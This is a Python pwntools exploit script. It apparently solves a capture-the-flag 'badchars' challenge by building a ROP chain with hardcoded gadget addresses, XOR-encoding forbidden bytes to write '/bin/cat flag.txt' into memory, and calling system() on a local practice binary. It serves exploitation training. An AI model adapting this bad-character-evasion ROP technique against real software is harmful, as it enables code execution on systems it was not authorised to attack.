#!/usr/bin/env python

import sys
import pwn
import time
import struct

import util

load = 0x00400b3b
store = 0x00400b34

xor_load = 0x00400b40
xor_store = 0x00400b30

pop_rdi = 0x00400b39

def pack(a):
    return struct.pack("<Q", a)

def chain(a):
    return ''.join(map(pack, a))

def write_string(loc, st):
    chain = ''
    for i in xrange(0, len(st), 8):
        data = st[i:i+8]
        data += '\0' * (8-len(data))
        chain += pack(load)
        chain += data
        chain += pack(loc + i)
        chain += pack(store)
    return chain

def xor(c, v):
    return chr(ord(c) ^ v)

def write_string_badchars(loc, st, badchars):
    nst = ''.join(c if c not in badchars else xor(c, 32) for c in st)
    chain = write_string(loc, nst)
    for i, c in enumerate(st):
        if c in badchars:
            # need to xor
            chain += pack(xor_load)
            chain += pack(32)
            chain += pack(loc + i)
            chain += pack(xor_store)
    return chain

def main():
    data_section = 0x00601050
    system = 0x004009e8

    ch = 'a' * 48
    ch += write_string_badchars(data_section, '/bin/cat flag.txt', 'bicfns/ ')
    ch += chain([pop_rdi, data_section, system])

    with open('badchars.in', 'wb') as f:
        f.write("{}\n".format(ch))
    print ch
    proc = pwn.process('./badchars')
    proc.sendline(ch)
    print proc.recvall()

if __name__ == '__main__':
    main()
